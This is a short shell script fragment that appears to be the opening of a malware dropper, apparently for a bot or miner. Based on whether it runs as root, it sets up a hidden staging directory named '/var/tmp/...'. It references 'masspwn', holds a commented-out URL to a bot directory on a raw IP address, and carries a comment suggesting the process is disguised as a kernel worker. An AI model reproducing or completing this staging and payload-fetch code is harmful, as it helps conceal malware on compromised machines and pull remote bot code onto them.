#!/bin/sh

#selection=$1
#if [ -z "$selection" ]; then export selection="masspwn" ; fi
if [ "$(whoami)" = "root" ]; then export SETPATH="/usr/bin" ; else export SETPATH="/var/tmp/..." ; fi
if [ ! -d "$SETPATH" ]; then mkdir -p $SETPATH ; fi



#http://45.9.148.35/.../bot/


# kworker/08:15-events
